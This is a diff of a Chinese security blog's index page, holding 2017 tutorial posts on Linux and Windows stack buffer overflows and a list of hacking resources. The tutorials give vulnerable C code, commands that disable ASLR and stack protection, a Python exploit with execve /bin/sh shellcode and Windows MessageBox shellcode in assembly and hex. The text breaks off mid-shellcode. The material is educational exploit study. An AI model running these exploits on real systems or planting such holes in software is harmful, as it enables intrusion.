-            <h4 id="gdb使用"><a href="#gdb使用" class="headerlink" title="gdb使用"></a>gdb使用</h4><p>gdb GNU Project Debugger<br>在linux下面调试程序必然会用到gdb，当然还有gdb的一个插件也是必须，那就是<a href="https://github.com/longld/peda" target="_blank" rel="external">peda</a><br>peda增强了gdb的功能，在调试过程中会显示反汇编的代码、寄存器、内存信息等</p>
-<ul>
-<li>aslr – 显示和设置GDB的aslr</li>
-<li>checksec – 显示多种安全机制的开关</li>
-<li>dumpargs – 当停到一个call 指令的时候，显示传递给函数的参数</li>
-<li>dumpprop – dump所有ROP gadgets 在一定的内存范围内</li>
-<li>elfheader – 获取被调试的ELF文件的头信息</li>
-<li>lefsymbol –获取非调试状态下的 符号信息</li>
-<li>lookup – 在一定地址范围内查找所有的地址以及引用</li>
-<li>patch – Patch memory start at an address with string/hexstring/int</li>
-<li>pattern – Generate, search, or write a cyclic pattern to memory</li>
-<li>procinfo – 从/proc/pid/显示不同的信息</li>
-<li>pshow – 显示peda的选项以及其它的设置</li>
-<li>pset – 设置peda的选项以及其它的设置</li>
-<li>readelf 获取ELF文件的头部信息</li>
-<li>ropgadget – Get common ROP gadgets of binary or library</li>
-<li>ropsearch – Search for ROP gadgets in memory</li>
-<li>searchmem|find – Search for a pattern in memory; support regex search</li>
-<li>shellcode – Generate or download common shellcodes.</li>
-<li>skeleton – Generate python exploit code template</li>
-<li>vmmap – Get virtual mapping address ranges of section(s) in debugged process</li>
-<li>xormem – XOR a memory region with a key</li>
-</ul>
-<p>在gdb中，常用的就是如下的命令<br>attach  附加某个进程进行调试<br>run 运行程序 ，会在断点处停下来<br>break或者b  xxx ，下断点<br>next 类似于od中的单步步过<br>step 类似于od中的单步步入</p>
-<h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><h2 id="什么是缓冲区溢出"><a href="#什么是缓冲区溢出" class="headerlink" title="什么是缓冲区溢出"></a>什么是缓冲区溢出</h2><ul>
-<li>拷贝源buffer到目的buffer可以导致溢出漏洞，需要满足两个条件</li>
-<li>1.源的string长度超过目的string的长度</li>
-<li>2.没有对拷贝的长度做检查<h2 id="两种缓冲区溢出"><a href="#两种缓冲区溢出" class="headerlink" title="两种缓冲区溢出"></a>两种缓冲区溢出</h2></li>
-<li>1.栈溢出-目的缓冲区是在栈中</li>
-<li>2.堆溢出-目的缓冲区是在堆中</li>
-<li>下面这张图展示了linux中内存的分块情况。<br><img src="/2017/08/16/linux栈溢出学习笔记/linux-memory-segment.jpg" alt=""><h2 id="后果"><a href="#后果" class="headerlink" title="后果"></a>后果</h2></li>
-<li><p>缓冲区溢出可以导致任意代码执行</p>
-<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><h2 id="1-漏洞示例代码"><a href="#1-漏洞示例代码" class="headerlink" title="1.漏洞示例代码"></a>1.漏洞示例代码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">//vuln.c</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line"></div><div class="line">int main(int argc, char* argv[]) &#123;</div><div class="line">        /* [1] */ char buf[256];</div><div class="line">        /* [2] */ strcpy(buf,argv[1]);</div><div class="line">        /* [3] */ printf(&quot;Input:%s\n&quot;,buf);</div><div class="line">        return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-</li>
-<li><p>注：本次测试的是在ubuntu14.04的X86上做的测试。</p>
-</li>
-<li><p>在编译之前我们首先要关闭系统的ASLR 方法是</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo -s</div><div class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</div></pre></td></tr></table></figure>
-</li>
-<li><p>编译</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$gcc -g -fno-stack-protector -z execstack -o vuln vuln.c //这里编译选项是关闭DEP和stack protector</div><div class="line">$sudo chown root vuln</div><div class="line">$sudo chgrp root vuln</div><div class="line">$sudo chmod +s vuln</div></pre></td></tr></table></figure>
-</li>
-</ul>
-<h2 id="2-如何利用"><a href="#2-如何利用" class="headerlink" title="2.如何利用"></a>2.如何利用</h2><ul>
-<li>任意代码执行使用的技术叫做“覆盖返回地址”，就是攻击者覆盖掉栈中的“返回地址”从而让指令寄存器转向去执行我们构造好的恶意代码。</li>
-<li>在看漏洞的利用代码之前，为了更好的理解，让我们来看一下这段有漏洞的代码的反汇编代码。<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">Dump of assembler code for function main:</div><div class="line">   //Function Prologue</div><div class="line">   0x08048414 &lt;+0&gt;:	push   ebp                      //备份调用者的ebp</div><div class="line">   0x08048415 &lt;+1&gt;:	mov    esp,ebp                 //设置esp和ebp相同</div><div class="line"></div><div class="line">   0x08048417 &lt;+3&gt;:	and    0xfffffff0,esp          //栈对齐</div><div class="line">   0x0804841a &lt;+6&gt;:	sub    0x110,esp               //开辟栈空间</div><div class="line">   0x08048420 &lt;+12&gt;:	mov    0xc(ebp),eax            //eax = argv</div><div class="line">   0x08048423 &lt;+15&gt;:	add    $0x4,eax                 //eax = &amp;argv[1]</div><div class="line">   0x08048426 &lt;+18&gt;:	mov    (eax),eax               //eax = argv[1]</div><div class="line">   0x08048428 &lt;+20&gt;:	mov    eax,0x4(esp)            //拷贝arg2</div><div class="line">   0x0804842c &lt;+24&gt;:	lea    0x10(esp),eax           //eax = &apos;buf&apos; </div><div class="line">   0x08048430 &lt;+28&gt;:	mov    eax,(esp)               //拷贝 arg1</div><div class="line">   0x08048433 &lt;+31&gt;:	call   0x8048330 &lt;strcpy@plt&gt;    //调用 strcpy</div><div class="line">   0x08048438 &lt;+36&gt;:	mov    $0x8048530,eax           //eax = format str &quot;Input: s\n&quot;</div><div class="line">   0x0804843d &lt;+41&gt;:	lea    0x10(esp), edx           //edx = buf</div><div class="line">   0x08048441 &lt;+45&gt;:	mov    edx,0x4(esp)            //printf arg2</div><div class="line">   0x08048445 &lt;+49&gt;:	mov    eax,(esp)               //printf arg1</div><div class="line">   0x08048448 &lt;+52&gt;:	call   0x8048320 &lt;printf@plt&gt;    //调用 printf</div><div class="line">   0x0804844d &lt;+57&gt;:	mov    $0x0,eax                 //return value 0</div><div class="line"></div><div class="line">   //收尾函数</div><div class="line">   0x08048452 &lt;+62&gt;:	leave                            //mov ebp, esp; pop ebp; </div><div class="line">   0x08048453 &lt;+63&gt;:	ret                              //return</div><div class="line">End of assembler dump.</div><div class="line">(gdb)</div></pre></td></tr></table></figure>
-</li>
-</ul>
-<p><img src="/2017/08/16/linux栈溢出学习笔记/stackmap.png" alt=""></p>
-<h2 id="3-测试步骤"><a href="#3-测试步骤" class="headerlink" title="3.测试步骤"></a>3.测试步骤</h2><ul>
-<li>1.是否可以覆盖返回地址<br><img src="/2017/08/16/linux栈溢出学习笔记/test1.png" alt=""></li>
-<li>可以看到当我们输出300个A的时候，程序EIP的指向了地址0x41414141（即我们用AAAA覆盖掉了返回地址）</li>
-<li>2.目标buffer的偏移怎么计算</li>
-<li>就是覆盖掉的地址换成我们恶意代码的入口地址怎么计算，他是0x10c=0x100（就是那256个字节）+0x8（对齐）+0x4（call ebp指令长度）</li>
-<li>因此当我们输入“A”<em>268+“B”</em>4的时候，就会依次覆盖掉buf、对齐、以及call ebp，即返回地址就是“BBBB”<br><img src="/2017/08/16/linux栈溢出学习笔记/test2.png" alt=""><br>正如我们所想！如上我们就控制了返回地址，且这个地址就在0xbfffeeb0这个地址上存放着。<br><img src="/2017/08/16/linux栈溢出学习笔记/test22.png" alt=""></li>
-<li><p>3.编写测试代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line">import struct</div><div class="line">from subprocess import call</div><div class="line"></div><div class="line">#Stack address where shellcode is copied.</div><div class="line">ret_addr = 0xbfffeeb0       </div><div class="line">              </div><div class="line">#Spawn a shell</div><div class="line">#execve(/bin/sh)</div><div class="line">scode = &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80&quot;</div><div class="line"></div><div class="line">#endianess convertion</div><div class="line">def conv(num):</div><div class="line"> return struct.pack(&quot;&lt;I&quot;,num)</div><div class="line">buf = &quot;A&quot; * 268</div><div class="line">buf += conv(ret_addr)</div><div class="line">buf += &quot;\x90&quot; * 100</div><div class="line">buf += scode</div><div class="line"></div><div class="line">print &quot;Calling vulnerable program&quot;</div><div class="line">call([&quot;./vuln&quot;, buf])</div></pre></td></tr></table></figure>
-</li>
-<li><p>4.结果截图<br><img src="/2017/08/16/linux栈溢出学习笔记/result.png" alt=""></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./vuln `python -c &quot;print &apos;A&apos;*268+&apos;\x80\xee\xff\xbf&apos;+&apos;\x90&apos;*100 + &apos;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80&apos;&quot;`</div></pre></td></tr></table></figure>
-</li>
-</ul>
-<p><img src="/2017/08/16/linux栈溢出学习笔记/commandlineexp.png" alt=""></p>
-<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><ul>
-<li>这里为了测试了简单的缓冲区溢出的基本原理我们关掉了一些防护比如内存地址随机化aslr以及DEP，后面有时间再学习和分享一下绕过这些防护的方法。<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><a href="https://sploitfun.wordpress.com/2015/05/08/classic-stack-based-buffer-overflow/" target="_blank" rel="external">Classic Stack Based Buffer Overflow</a><br>[How to exploit a buffer overflow vulnerability - Practical]<br>(<a href="https://www.youtube.com/watch?v=hJ8IwyhqzD4" target="_blank" rel="external">https://www.youtube.com/watch?v=hJ8IwyhqzD4</a>)<br><a href="https://www.youtube.com/watch?v=1S0aBV-Waeo" target="_blank" rel="external">Buffer Overflow Attack - Computerphile</a><br><a href="https://www.youtube.com/watch?v=eYrfWpkvMxA" target="_blank" rel="external">Kali Linux 2016.1 - Buffer Overflow Tutorial</a><br><a href="http://blog.csdn.net/21cnbao/article/details/7385161" target="_blank" rel="external">Linux gdb调试器用法全面解析</a><br><a href="http://drops.xmd5.com/static/drops/tips-6597.html" target="_blank" rel="external">一步一步学ROP之linux_x86篇</a><br><a href="https://exploit-exercises.com/" target="_blank" rel="external">linux溢出练习</a><br><a href="http://louisrli.github.io/blog/2012/06/22/nebula0/#.WnGH9pP1U0o" target="_blank" rel="external">Nebula Shell Exploits</a><br><a href="https://sploitfun.wordpress.com/2015/" target="_blank" rel="external">Linux (x86) Exploit Development Series</a><br><a href="https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/DEFCONCTF/babysfirst/r0pbaby" target="_blank" rel="external">DEF CON CTF Quals 2015: r0pbaby</a><br><a href="http://blog.csdn.net/linyt/article/details/51635768" target="_blank" rel="external">聊聊Linux动态链接中的PLT和GOT（１）——何谓PLT与GOT</a><br><a href="https://www.youtube.com/watch?v=hJ8IwyhqzD4" target="_blank" rel="external">How to exploit a buffer overflow vulnerability - Practical</a></li>
-</ul>
+          gdb使用gdb GNU Project Debugger在linux下面调试程序必然会用到gdb，当然还有gdb的一个插件也是必须，那就是pedapeda增强了gdb的功能，在调试过程中会显示反汇编的代码、寄存器、内存信息等
 
-          
+aslr – 显示和设置GDB的aslr
+checksec – 显示多
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2017/08/16/linux栈溢出学习笔记/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -871,7 +1133,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">
+          <h2 class="post-title" itemprop="name headline">
             
             
               
@@ -881,11 +1143,21 @@
                 </a>
               
             
-          </h1>
+          </h2>
         
 
         <div class="post-meta">
           <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-08-09T14:56:42+08:00">
+                2017-08-09
+              </time>
             
 
             
@@ -905,6 +1177,37 @@
           
 
           
+            <div class="post-wordcount">
+              
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计</span>
+                
+                <span title="字数统计">
+                  
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
 
           
           
@@ -920,69 +1223,18 @@
       
         
           
-            <h4 id="About"><a href="#About" class="headerlink" title="About"></a>About</h4><p>这里推荐一下github上的一个项目<a href="https://github.com/Hack-with-Github/Awesome-Hacking" target="_blank" rel="external">Awesome-Hacking</a><br>安全研究方向的一些参考资源，质量还是不错的,涵盖的方面比较的广.</p>
-<h4 id="list"><a href="#list" class="headerlink" title="list"></a>list</h4><p>Android安全：收集了各种Android工具、报告/研究/书籍、漏洞/利用代码等资源</p>
-<p>应用安全：了解学习应用程序安全的资源列表</p>
-<p>漏洞赏金：漏洞赏金计划集合和著名赏金猎人博客列表</p>
-<p>Cheatsheets：常见的渗透测试/安全备忘录</p>
-<p>CTF：CTF框架、类库、资源、软件和教程清单</p>
-<p>网络攻击环境：可以合法地锻炼培养自己攻击技能的环境集合</p>
-<p>安全开发运维：devsecops.org社区贡献的权威devsecops工具列表</p>
-<p>Exploit开发：学习exploit开发的资源</p>
-<p>Fuzzing：各种fuzzing图书、课程、工具、教程和易受攻击应用集合</p>
-<p>Hacking：Awesome Hacking资源列表</p>
-<p>蜜罐：包括不同类型的蜜罐、蜜罐工具、蜜罐分析等</p>
-<p>事件响应：旨在帮助安全分析师和数字取证人员</p>
-<p>工控安全：包括工具、蜜罐、数据、警报和新闻、会议各种工控安全等</p>
-<p>信息安全：有各种信息安全公开课、培训信息</p>
-<p>IoT安全：聚合了大量IoT破解案例，如RFID、门铃、中控、可穿戴等</p>
-<p>恶意软件分析：包括恶意软件收集、开源威胁情报、检测、沙箱等</p>
-<p>开源情报：情报界的各种开源情报来源</p>
-<p>OS X和iOS安全：OS X和iOS安全工具集合</p>
-<p>Pcaptools：流量处理的命令集、捕获工具、分析检查、DNS配置等工具资源</p>
-<p>渗透测试：在线渗透测试资源、Shellcode开发、开源情报资源、社会工程资源等</p>
-<p>PHP安全：PHP生成安全随机数、加密数据、检查漏洞等类库</p>
-<p>逆向：关于逆向的图书、培训、实战、工具等</p>
-<p>安全演讲：收集了2013-2017年各类安全大会演讲视频</p>
-<p>SecLists：安全测试人员进行评估检查需要用到的技能</p>
-<p>Security：Awesome Security，一个社区驱动的知名安全资源分类集合</p>
-<p>社会工程学：仅供网络安全人员、渗透测试人员在受控环境用于教育用途</p>
-<p>静态分析：针对各种编程语言的静态分析工具、linters、代码质量检查等</p>
-<p>威胁情报：包括常见威胁情报来源、格式、架构、工具、研究标准书籍等</p>
-<p>车辆安全：关于车辆安全的学习资源、项目、软硬件、汽车黑客案例、Twitter follower列表等</p>
-<p>漏洞研究：相对偏学术方向，有不少书籍、会议、报告等推荐</p>
-<p>Web黑客：Web安全入门各种书籍、文档、工具</p>
-<p>Windows漏洞利用：Windows堆栈溢出、内核攻击、内存损坏、内存保护等内容资源</p>
-<p>WiFi兵工厂：针对802.11协议攻击的各类工具</p>
-<h4 id="可用知识库"><a href="#可用知识库" class="headerlink" title="可用知识库"></a>可用知识库</h4><p>API安全检查清单：当你设计、测试、发布API时，需要核对的安全细节清单</p>
-<p>APT Notes：2008年至今的所有APT行动披露报告汇总，中国出现了11次</p>
-<p>赏金漏洞披露列表：偏Web向的常见漏洞类型案例披露</p>
-<p>密码学：密码学的理论、工具、框架、资源等</p>
-<p>CFT工具：CTF从入门到了解各种工具</p>
-<p>CVE PoC库：博主从13年到现在收集的数十个CVE漏洞的PoC</p>
-<p>取证：数字取证的常见工具资源</p>
-<p>免费编程书：关于系统、数据库、IDE、编程语言等方面的免费书</p>
-<p>灰帽黑客资源：CTF、加密学、Linux Hacking、USB Hacking、漏洞等</p>
-<p>信息安全入门：包括信息安全博客、认证、课程、社区、播客、工具等</p>
-<p>安全资源：一个类似MITRE ATT&amp;C的框架</p>
-<p>IOC：常见IOC资源、工具</p>
-<p>Linux内核利用库：2005年至今的Linux内核利用技术演讲、漏洞、Writeups等</p>
-<p>网络安全领域的机器学习：相关研究的数据集、论文、书籍、演讲等</p>
-<p>恶意软件脚本：博主收集的二十几个脚本</p>
-<p>Payloads：一大波常见Web攻击Payloads</p>
-<p>Payloads集合：比上面这个更丰富的常见Web攻击Payloads</p>
-<p>五星级Cheatsheets：包括OS X命令行、PowerShell命令行、Google Dorks、Shodan、exploit开发、Java反序列化等最全备忘</p>
-<p>Pentest Wiki：博主收集的在线安全知识库，里边涵盖网络分析、Web应用、开源情报、漏洞分析、编程开发等多个领域</p>
-<p>字典：作者自称找了超过80GB密码库，从中总结出这个字典项目</p>
-<p>Resource List：零碎的GitHub安全项目汇总，涉及PWND、PowerShell、CTF、恶意软件等</p>
-<p>逆向工程：常见软件、类库、书籍、技术分析、开发等</p>
-<p>RF安全工具箱：国人@cn0xroot 聚合的各类射频资源集合，包括SDR、GSM、3G、4G LTE、NFC&amp;RFID、ZigBee等</p>
-<p>安全备忘录：收集了许多信息安全工具和主题</p>
-<p>安全清单：一大波详实的全系列安全资源</p>
-<p>Shell：一系列Shell命令行、工具、指南等</p>
-<p>威胁猎人攻略：帮助安全分析师利用Sysmon和Windows Events日志来进行事件分析，涉及Splunk、ELK、Sigma、GrayLog等工具</p>
-
-          
+          About这里推荐一下github上的一个项目Awesome-Hacking安全研究方向的一些参考资源，质量还是不错的,涵盖的方面比较的广.
+listAndroid安全：收集了各种Android工具、报告/研究/书籍、漏洞/利用代码等资源
+应用安全：了解学习应用程序安全的资源列表
+漏洞赏金：漏洞赏金
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2017/08/09/Awosome-Hacking系列/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1041,7 +1293,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">
+          <h2 class="post-title" itemprop="name headline">
             
             
               
@@ -1051,11 +1303,21 @@
                 </a>
               
             
-          </h1>
+          </h2>
         
 
         <div class="post-meta">
           <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-08-02T17:15:16+08:00">
+                2017-08-02
+              </time>
             
 
             
@@ -1075,6 +1337,37 @@
           
 
           
+            <div class="post-wordcount">
+              
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计</span>
+                
+                <span title="字数统计">
+                  
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
 
           
           
@@ -1090,25 +1383,16 @@
       
         
           
-            <h4 id="概念知识点"><a href="#概念知识点" class="headerlink" title="概念知识点"></a>概念知识点</h4><ul>
-<li>在程序执行的过程中，cpu会不断处理数据，而cpu处理的数据通常来自3个地方<br>1.数据在指令中直接给出<br>2.数据在寄存器中<br>3.数据在内存中<h4 id="漏洞利用原理简介"><a href="#漏洞利用原理简介" class="headerlink" title="漏洞利用原理简介"></a>漏洞利用原理简介</h4>本次实例中的windows缓冲区溢出的原理还是比较简单的，首先使用jmp esp覆盖函数的返回地址，然后esp此时存放的正是shellcode的地址，那么shellcode本来是作为数据的结果被当做指令给执行了。感觉其实和sql注入啊，xss啥的都差不多，都是”数据”被当做代码或者指令给执行了 :)<h4 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">int main()</div><div class="line">&#123;</div><div class="line">	char buffer[8];</div><div class="line">	LoadLibrary(&quot;user32.dll&quot;);</div><div class="line">	strcpy(buffer,name);</div><div class="line">	printf(&quot;%s\n&quot;,buffer);</div><div class="line">	getchar();</div><div class="line">	return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-</li>
-</ul>
-<p>主要是利用strcpy函数的复制，当name的内容大于buffer的大小时候，这个时候会产生异常，Exception code: C0000005 ACCESS_VIOLATION。</p>
-<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>利用栈溢出弹出一个MessageBox的框</p>
-<h4 id="辅助工具代码"><a href="#辅助工具代码" class="headerlink" title="辅助工具代码"></a>辅助工具代码</h4><p>以下代码用于定位user32.dll中的MessageBox以及kernel32.dll中的ExitProcess地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">#include &quot;windows.h&quot;</div><div class="line">#include &quot;stdio.h&quot;</div><div class="line"></div><div class="line">typedef void (*MYPROC)(LPTSTR);</div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">	HINSTANCE LibHandle;</div><div class="line">	MYPROC ProcAdd;</div><div class="line">	LibHandle = LoadLibrary(&quot;kernel32&quot;);</div><div class="line">	//LibHandle = LoadLibrary(&quot;user32&quot;);</div><div class="line">	printf(&quot;kernel LibHandle = //x%x\n&quot;,LibHandle);</div><div class="line">	ProcAdd = (MYPROC)GetProcAddress(LibHandle,&quot;ExitProcess&quot;);</div><div class="line">	//ProcAdd = (MYPROC)GetProcAddress(LibHandle,&quot;MessageBoxA&quot;);</div><div class="line">	printf(&quot;system = //x%x\n&quot;,ProcAdd);</div><div class="line"></div><div class="line">	return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>以下代码用于发现user32.dll(当然其它dll中也存在jmp esp操作码的地址)中jmp esp的操作码的地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">#include &quot;windows.h&quot;</div><div class="line">#include &quot;stdio.h&quot;</div><div class="line">#include &quot;stdlib.h&quot;</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">		BYTE *ptr;</div><div class="line">		int position;</div><div class="line">		HINSTANCE handle;</div><div class="line">		BOOL done_flag = FALSE;</div><div class="line">		handle = LoadLibrary(&quot;user32.dll&quot;);</div><div class="line">		if(!handle)</div><div class="line">		&#123;</div><div class="line">			printf(&quot;Load dll error&quot;);</div><div class="line">			exit(0);</div><div class="line">		&#125;</div><div class="line">		ptr = (BYTE*)handle;</div><div class="line"></div><div class="line">		for(position = 0; !done_flag; position++ )</div><div class="line">		&#123;</div><div class="line">			try</div><div class="line">			&#123;</div><div class="line">				if(ptr[position]==0xFF &amp;&amp; ptr[position+1]==0xE4)</div><div class="line">				&#123;</div><div class="line">					int address = (int)ptr + position;</div><div class="line">					printf(&quot;OPCODE found at 0x%x\n&quot;,address);</div><div class="line">				&#125;</div><div class="line">			&#125;</div><div class="line">			catch(...)</div><div class="line">			&#123;</div><div class="line">				int address = (int)ptr + position;</div><div class="line">				printf(&quot;END OPCODE found at 0x%x\n&quot;,address);</div><div class="line">				done_flag = true;</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">		getchar();</div><div class="line">	return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<h4 id="汇编利用代码实现"><a href="#汇编利用代码实现" class="headerlink" title="汇编利用代码实现"></a>汇编利用代码实现</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line">#include &quot;windows.h&quot;</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">	_asm&#123;</div><div class="line">		sub esp,0x50</div><div class="line">		xor ebx,ebx</div><div class="line">		push ebx</div><div class="line">		push 0x20676e69</div><div class="line">		push 0x6e726157  //push &quot;Warning&quot;</div><div class="line">		mov eax,esp</div><div class="line">		push ebx</div><div class="line">		push 0x20202021    //push &quot;you have been hacked by M0rk!&quot;</div><div class="line">		push 0x6b72304d</div><div class="line">		push 0x20796220</div><div class="line">		push 0x64656b63</div><div class="line">		push 0x6168206e</div><div class="line">		push 0x65656220</div><div class="line">		push 0x65766168</div><div class="line">		push 0x20756f79</div><div class="line">		mov ecx,esp</div><div class="line">			</div><div class="line">		push ebx</div><div class="line">		push eax</div><div class="line">		push ecx</div><div class="line">		push ebx</div><div class="line">		mov eax,0x761aea99</div><div class="line">		call eax</div><div class="line">		push ebx</div><div class="line">		mov eax,0x7700be52</div><div class="line">        call eax</div><div class="line">	&#125;</div><div class="line">	return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<h4 id="shellcode编写"><a href="#shellcode编写" class="headerlink" title="shellcode编写"></a>shellcode编写</h4><p>通过ollydbg或者<a href="https://3gstudent.github.io/3gstudent.github.io/Windows-Shellcode%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E9%80%9A%E8%BF%87VisualStudio%E7%94%9F%E6%88%90shellcode/" target="_blank" rel="external">vs</a>查看机器码<br>或者<a href="http://brieflyx.me/2015/linux-tools/msfvenom-intro/" target="_blank" rel="external">msf</a>生成<br>机器码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">83EC 50</div><div class="line">33DB</div><div class="line">53</div><div class="line">68 696E6720</div><div class="line">68 5761726E</div><div class="line">8BC4</div><div class="line">53</div><div class="line">68 21202020</div><div class="line">68 4D30726B</div><div class="line">68 20627920</div><div class="line">68 